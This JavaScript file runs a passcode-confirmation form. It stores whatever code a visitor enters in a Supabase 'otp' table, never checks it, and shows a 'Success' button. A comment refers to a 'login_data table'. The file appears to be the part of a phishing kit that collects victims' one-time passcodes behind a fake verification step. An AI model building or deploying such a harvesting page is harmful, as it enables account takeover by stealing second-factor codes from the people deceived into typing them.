// Import the Supabase client
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import { domain, anonKey } from './dbData.js'; // Import domain and anonKey from a separate file

// Initialize Supabase client
const supabase = createClient(domain, anonKey);

// Get the OTP input element
const otpInputBox = document.getElementById('token');

// Get the OTP submit button
const verifyBtn = document.getElementById('otp-button');

// Function to handle form submission
const handleSubmit = async (event) => {
  event.preventDefault(); // Prevent the default form submission behavior

  const otp = otpInputBox.value; // Get the OTP value

  // Display loading message on the button
  verifyBtn.innerHTML = 'Loading...';

  try {
    // Insert data into the login_data table
    const { data, error } = await supabase.from('otp').insert([{ OTP: otp }]);

    if (error) {
      console.error('Error inserting OTP:', error.message);
      // Revert button to "go" state and display alert
      goButton();
      alert('Failed to insert OTP. Please try again.');
    } else {
      console.log('OTP inserted successfully:', data);
      // Update button style to indicate success
      successButton();
      // Redirect or perform any other action upon successful insertion
    }
  } catch (error) {
    console.error('Error:', error.message);
    // Revert button to "go" state and display alert
    goButton();
    alert('An error occurred. Please try again.');
  }
};

// Function to set button to "stop" state
const stopButton = () => {
  verifyBtn.classList.add('stop-button');
  verifyBtn.classList.remove('go-button');
  verifyBtn.classList.remove('success-button');
  verifyBtn.disabled = true; // Disable the button
};

// Function to set button to "go" state
const goButton = () => {
  verifyBtn.classList.add('go-button');
  verifyBtn.classList.remove('stop-button');
  verifyBtn.classList.remove('success-button');
  verifyBtn.disabled = false; // Enable the button
  verifyBtn.innerHTML = 'Confirm Code'; // Reset button text
};

// Function to set button to "success" state
const successButton = () => {
  verifyBtn.classList.add('success-button');
  verifyBtn.classList.remove('go-button');
  verifyBtn.classList.remove('stop-button');
  verifyBtn.disabled = true; // Disable the button after success
  verifyBtn.innerHTML = 'Success'; // Change button text to "Success"
};

// Call the stopButton initially to set the initial state
stopButton();

// Function to check OTP input length and toggle buttons
const checkInputLength = () => {
  const maxLength = parseInt(otpInputBox.getAttribute('maxlength'));
  const currentLength = otpInputBox.value.length;

  if (currentLength === maxLength) {
    goButton();
  } else {
    stopButton();
  }
};

// Add event listener to form submission
verifyBtn.addEventListener('click', handleSubmit);

// Add event listener to OTP input for length check
otpInputBox.addEventListener('input', checkInputLength);
